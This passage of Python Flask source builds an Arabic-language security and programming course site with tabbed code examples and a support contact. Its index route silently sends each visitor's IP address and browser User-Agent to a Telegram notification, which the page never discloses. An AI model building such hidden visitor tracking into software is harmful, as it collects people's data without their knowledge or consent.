        "description": f"📚 درس متكامل في {course['name']}\n\n🎯 المستوى: {course['level']}\n⏱️ المدة: {course['duration']}\n📂 القسم: {course['category']}\n\nهذا الدرس يحتوي على 100 مثال تعليمي مختلف مع شرح لكل مثال.",
        "codes": codes
    }

COURSE_LIST = []
for course in programming_courses + pentest_courses + tools_courses:
    COURSE_LIST.append({
        "id": course["id"],
        "name": course["name"],
        "category": course["category"]
    })

# ===== الصفحات =====
@app.route('/')
def index():
    try:
        visitor_ip = request.remote_addr
        user_agent = request.headers.get('User-Agent', 'غير معروف')
        message = f"""🟢 <b>تم زيارة الموقع!</b>

📱 <b>المستخدم:</b> @SSSTlF
🌐 <b>IP:</b> {visitor_ip}
💻 <b>المتصفح:</b> {user_agent[:100]}
📚 <b>الدورس:</b> {len(COURSE_LIST)} درس
⏰ <b>الوقت:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

<b>ABOOD_SECURE_ACADEMY</b>"""
        threading.Thread(target=send_telegram_notification, args=(message,)).start()
    except Exception as e:
        print(f"خطأ في إرسال الإشعار: {e}")
    
    return '''
    <!DOCTYPE html>
    <html>
    <head><title>ABOOD_SECURE_ACADEMY</title>
    <style>
        body { background: #0a0a0a; color: #00ff41; font-family: Arial; text-align: center; padding: 50px; }
        h1 { font-size: 3rem; text-shadow: 0 0 30px #00ff41; }
        .stats { display: flex; justify-content: center; gap: 30px; flex-wrap: wrap; }
        .stat { border: 1px solid #00ff41; padding: 15px 30px; border-radius: 10px; }
        .support { color: #ff00ff; border-color: #ff00ff; padding: 10px 30px; border-radius: 10px; display: inline-block; margin-top: 30px; }
        a { color: #00ff41; text-decoration: none; border: 1px solid #00ff41; padding: 10px 30px; border-radius: 10px; display: inline-block; margin: 5px; }
        a:hover { background: #00ff41; color: #000; }
    </style>
    </head>
    <body>
        <h1>⚡ ABOOD_SECURE_ACADEMY</h1>
        <p>منصة تعليمية شاملة - 100 كود لكل درس</p>
        <div class="stats">
            <div class="stat">📚 114 درس</div>
            <div class="stat">💻 100 كود لكل درس</div>
            <div class="stat">🛡️ تعليم حقيقي</div>
        </div>
        <div style="margin: 30px 0;">
            <a href="/course/python1">▶️ ابدأ التعلم</a>
        </div>
        <div class="support">🛡️ الدعم الفني: @SSSTlF عبود</div>
        <p style="color: #444; margin-top: 30px;">© 2026 ABOOD_SECURE_ACADEMY</p>
    </body>
    </html>
    '''

@app.route('/course/<course_id>')
def course_page(course_id):
    if course_id not in COURSES_DATA:
        return "الدرس غير موجود", 404
    
    course = COURSES_DATA[course_id]
    
    # بناء التبويبات
    tabs_html = ""
    for i in range(1, 101):
        active = 'active' if i == 1 else ''
        tabs_html += f'<button class="tab {active}" onclick="showCode({i-1})">مثال {i}</button>'
    
    # إعداد الكود الأول
    first_code = course['codes'][0].replace('\n', '\\n').replace('"', '\\"')
    
    return f'''
    <!DOCTYPE html>
    <html>
    <head><title>{course['name']} - ABOOD_SECURE</title>
    <style>
        body {{ background: #0a0a0a; color: #e0e0e0; font-family: Arial; padding: 30px; }}
        .card {{ background: rgba(0,0,0,0.9); border: 2px solid #00ff41; border-radius: 16px; padding: 40px; max-width: 900px; margin: auto; }}
        h1 {{ color: #00ff41; text-shadow: 0 0 30px #00ff41; }}
        .meta {{ display: flex; gap: 20px; flex-wrap: wrap; margin: 20px 0; }}
        .meta span {{ border: 1px solid #333; padding: 5px 15px; border-radius: 10px; }}
        .code {{ background: #0d0d0d; border: 1px solid #333; border-radius: 10px; padding: 20px; overflow-x: auto; font-family: monospace; color: #00ff88; }}
        .copy-btn {{ background: transparent; border: 1px solid #00ff41; color: #00ff41; padding: 8px 20px; border-radius: 6px; cursor: pointer; }}
        .copy-btn:hover {{ background: #00ff41; color: #000; }}
        .back {{ color: #00ff41; text-decoration: none; border: 1px solid #00ff41; padding: 8px 20px; border-radius: 6px; display: inline-block; margin: 10px 0; }}
        .support {{ color: #ff00ff; border-color: #ff00ff; padding: 8px 20px; border-radius: 6px; display: inline-block; margin: 10px; cursor: pointer; background: transparent; border: 1px solid #ff00ff; }}
        .support:hover {{ background: #ff00ff; color: #000; }}
        .tabs {{ display: flex; flex-wrap: wrap; gap: 5px; margin: 15px 0; max-height: 150px; overflow-y: auto; }}
        .tab {{ padding: 5px 12px; border: 1px solid #333; border-radius: 4px; cursor: pointer; background: transparent; color: #888; }}
        .tab.active {{ border-color: #00ff41; color: #00ff41; background: rgba(0,255,65,0.05); }}
        .tab:hover {{ border-color: #00ff41; }}
        pre {{ margin: 0; }}
    </style>
    </head>
    <body>
        <div class="card">
            <a href="/" class="back">← العودة</a>
            <button class="support" onclick="document.getElementById('supportModal').style.display='flex'">🛡️ الدعم الفني</button>
            <h1>{course['name']}</h1>
            <div class="meta">
                <span>📊 {course['level']}</span>
                <span>⏱️ {course['duration']}</span>
                <span>📂 {course['category']}</span>
                <span>💯 100 كود</span>
            </div>
            <p style="color: #888;">{course['description']}</p>
            
            <div class="tabs" id="tabs">
                {tabs_html}
            </div>
            <div class="code">
                <button class="copy-btn" onclick="copyCode()">📋 نسخ</button>
                <pre id="codeDisplay" style="margin-top:10px;white-space:pre-wrap;">{course['codes'][0]}</pre>
            </div>
        </div>
        
        <div id="supportModal" style="display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:999;justify-content:center;align-items:center;">
            <div style="background:#0a0a0a;border:2px solid #ff00ff;padding:40px;border-radius:16px;text-align:center;max-width:500px;">
                <h2 style="color:#ff00ff;">🛡️ الدعم الفني</h2>
                <div style="font-size:2rem;color:#00ff41;padding:15px;border:1px solid #00ff41;border-radius:8px;margin:20px 0;">@SSSTlF عبود</div>
                <button onclick="document.getElementById('supportModal').style.display='none'" style="background:transparent;border:1px solid #ff3333;color:#ff3333;padding:10px 30px;border-radius:4px;cursor:pointer;">إغلاق</button>
            </div>
        </div>
        
        <script>
            const codes = {json.dumps(course['codes'])};
            let currentIndex = 0;
            
            function showCode(index) {{
                currentIndex = index;
                document.getElementById('codeDisplay').textContent = codes[index];
                document.querySelectorAll('.tab').forEach((tab, i) => {{
                    tab.classList.toggle('active', i === index);
                }});
            }}
            
            function copyCode() {{
                const code = document.getElementById('codeDisplay').textContent;
                navigator.clipboard.writeText(code).then(() => {{
                    const btn = document.querySelector('.copy-btn');
                    btn.textContent = '✅ تم النسخ';
                    setTimeout(() => btn.textContent = '📋 نسخ', 2000);
                }});
            }}
            
            document.addEventListener('keydown', function(e) {{
                if (e.key === 'ArrowRight' && currentIndex < 99) {{
                    showCode(currentIndex + 1);
                    e.preventDefault();
                }} else if (e.key === 'ArrowLeft' && currentIndex > 0) {{
                    showCode(currentIndex - 1);
                    e.preventDefault();
                }}
                if (e.ctrlKey && e.shiftKey && (e.key === 'S' || e.key === 's')) {{
                    e.preventDefault();
                    document.getElementById('supportModal').style.display = 'flex';
                }}
            }});
            
            console.log('%c◼ ABOOD_SECURE_ACADEMY ◼', 'color: #00ff41; font-size: 20px;');
            console.log('الدعم الفني: @SSSTlF عبود');
        </script>
    </body>
    </html>
    '''

@app.route('/api/course/<course_id>')
def get_course(course_id):
    if course_id in COURSES_DATA:
        return jsonify(COURSES_DATA[course_id])
    return jsonify({"error": "الدرس غير موجود"}), 404

@app.route('/api/notify')
def notify():
    message = "🔔 <b>اختبار الإشعار</b>\n\nتم إرسال هذا الإشعار من API"
    result = send_telegram_notification(message)
    return jsonify({"status": "sent", "result": result})

if __name__ == '__main__':
    try:
        message = f"""🚀 <b>تم تشغيل الخادم!</b>

📚 <b>ABOOD_SECURE_ACADEMY</b>
📖 <b>عدد الدورس:</b> {len(COURSE_LIST)} درس
💻 <b>الأكواد:</b> 100 كود لكل درس
🛡️ <b>الدعم:</b> @SSSTlF
⏰ <b>الوقت:</b> {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}

✅ النظام جاهز للعمل"""
        send_telegram_notification(message)
    except Exception as e:
        print(f"خطأ في إرسال إشعار التشغيل: {e}")
    
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
